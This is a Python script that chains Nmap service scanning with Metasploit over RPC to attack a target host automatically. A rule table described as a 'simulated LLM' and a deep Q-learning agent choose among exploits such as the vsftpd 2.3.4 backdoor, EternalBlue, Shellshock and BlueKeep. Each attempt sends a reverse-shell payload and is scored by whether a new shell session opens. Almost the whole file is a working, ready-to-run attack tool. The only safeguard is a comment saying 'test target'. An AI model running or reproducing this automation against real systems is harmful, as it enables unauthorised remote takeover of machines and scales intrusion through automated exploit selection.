import msfrpc
import nmap
import numpy as np
import tensorflow as tf
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense
from collections import deque
import random
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize Metasploit RPC client
try:
    client = msfrpc.MsfRpcClient('your_password', username='your_username')
    logging.info("Connected to Metasploit RPC server")
except Exception as e:
    logging.error(f"Failed to connect to Metasploit RPC: {e}")
    exit(1)

# Simulated LLM component (rule-based decision system)
class SimulatedLLM:
    def __init__(self):
        self.exploit_db = {
            ('linux', 21, 'vsftpd 2.3.4'): 'exploit/unix/ftp/vsftpd_234_backdoor',
            ('windows', 445, 'smb'): 'exploit/windows/smb/ms17_010_eternalblue',
            ('linux', 80, 'apache'): 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
            ('windows', 3389, 'rdp'): 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'
        }

    def interpret_scan(self, target_info):
        """Interpret Nmap scan results and suggest an exploit."""
        os_type = target_info.get('os', 'unknown').lower()
        services = target_info.get('services', [])
        for service in services:
            port = service.get('port')
            info = service.get('info', '').lower()
            for (db_os, db_port, db_info), exploit in self.exploit_db.items():
                if os_type in db_os and port == db_port and db_info in info:
                    return exploit
        return None

    def generate_exploit_script(self, exploit_module):
        """Generate a pseudo-script for the exploit (placeholder for LLM)."""
        return f"""
# Pseudo-script for {exploit_module}
use {exploit_module}
set RHOSTS {{target_ip}}
set PAYLOAD generic/shell_reverse_tcp
run
"""

# Reinforcement Learning Agent (Deep Q-Learning)
class DQNAgent:
    def __init__(self, state_size, action_size):
        self.state_size = state_size
        self.action_size = action_size
        self.memory = deque(maxlen=2000)
        self.gamma = 0.95  # Discount factor
        self.epsilon = 1.0  # Exploration rate
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.995
        self.model = self._build_model()

    def _build_model(self):
        model = Sequential()
        model.add(Dense(24, input_dim=self.state_size, activation='relu'))
        model.add(Dense(24, activation='relu'))
        model.add(Dense(self.action_size, activation='linear'))
        model.compile(loss='mse', optimizer=tf.keras.optimizers.Adam(learning_rate=0.001))
        return model

    def remember(self, state, action, reward, next_state, done):
        self.memory.append((state, action, reward, next_state, done))

    def act(self, state):
        if np.random.rand() <= self.epsilon:
            return random.randrange(self.action_size)
        act_values = self.model.predict(state)
        return np.argmax(act_values[0])

    def replay(self, batch_size):
        minibatch = random.sample(self.memory, batch_size)
        for state, action, reward, next_state, done in minibatch:
            target = reward
            if not done:
                target = reward + self.gamma * np.amax(self.model.predict(next_state)[0])
            target_f = self.model.predict(state)
            target_f[0][action] = target
            self.model.fit(state, target_f, epochs=1, verbose=0)
        if self.epsilon > self.epsilon_min:
            self.epsilon *= self.epsilon_decay

# Scan target with Nmap
def scan_target(target_ip):
    nm = nmap.PortScanner()
    try:
        nm.scan(target_ip, arguments='-sV')
        target_info = {
            'os': nm[target_ip].get('osmatch', [{}])[0].get('name', 'unknown'),
            'services': [
                {'port': port, 'info': nm[target_ip]['tcp'][port].get('product', '') + ' ' + nm[target_ip]['tcp'][port].get('version', '')}
                for port in nm[target_ip]['tcp']
            ]
        }
        logging.info(f"Scanned target {target_ip}: {target_info}")
        return target_info
    except Exception as e:
        logging.error(f"Error scanning target {target_ip}: {e}")
        return None

# Execute exploit
def run_exploit(exploit_module, target_ip):
    try:
        exploit = client.modules.use('exploit', exploit_module)
        exploit['RHOSTS'] = target_ip
        result = client.sessions.list
        exploit.execute(payload='generic/shell_reverse_tcp')
        time.sleep(5)  # Wait for session
        new_sessions = client.sessions.list
        if len(new_sessions) > len(result):
            logging.info(f"Exploit {exploit_module} succeeded on {target_ip}")
            return 1  # Reward for success
        else:
            logging.info(f"Exploit {exploit_module} failed on {target_ip}")
            return -1  # Penalty for failure
    except Exception as e:
        logging.error(f"Error running exploit {exploit_module}: {e}")
        return -1

# Main automation workflow
def main():
    target_ip = '192.168.1.100'  # Replace with your test target IP
    exploit_list = [
        'exploit/unix/ftp/vsftpd_234_backdoor',
        'exploit/windows/smb/ms17_010_eternalblue',
        'exploit/multi/http/apache_mod_cgi_bash_env_exec',
        'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'
    ]

    # Initialize simulated LLM and RL agent
    llm = SimulatedLLM()
    state_size = 3  # Example: [os_type, port, service_score]
    action_size = len(exploit_list)
    agent = DQNAgent(state_size, action_size)

    # Main loop
    episodes = 100
    batch_size = 32
    for episode in range(episodes):
        logging.info(f"Starting episode {episode + 1}")
        
        # Scan target
        target_info = scan_target(target_ip)
        if not target_info:
            logging.error("Scan failed, skipping episode")
            continue

        # Prepare state for RL
        os_score = 1 if 'linux' in target_info['os'].lower() else 2
        port = target_info['services'][0]['port'] if target_info['services'] else 0
        service_score = len(target_info['services'])
        state = np.array([[os_score, port, service_score]])

        # Try LLM suggestion first
        exploit_module = llm.interpret_scan(target_info)
        if exploit_module and exploit_module in exploit_list:
            logging.info(f"LLM suggested exploit: {exploit_module}")
            reward = run_exploit(exploit_module, target_ip)
        else:
            # Fallback to RL agent
            action = agent.act(state)
            exploit_module = exploit_list[action]
            logging.info(f"RL agent selected exploit: {exploit_module}")
            reward = run_exploit(exploit_module, target_ip)

        # Update RL agent
        next_state = state  # Simplified: assume state doesn't change
        done = reward == 1
        agent.remember(state, exploit_list.index(exploit_module), reward, next_state, done)
        if len(agent.memory) > batch_size:
            agent.replay(batch_size)

        if done:
            logging.info("Successful exploitation, stopping episode")
            break

if __name__ == '__main__':
    main()
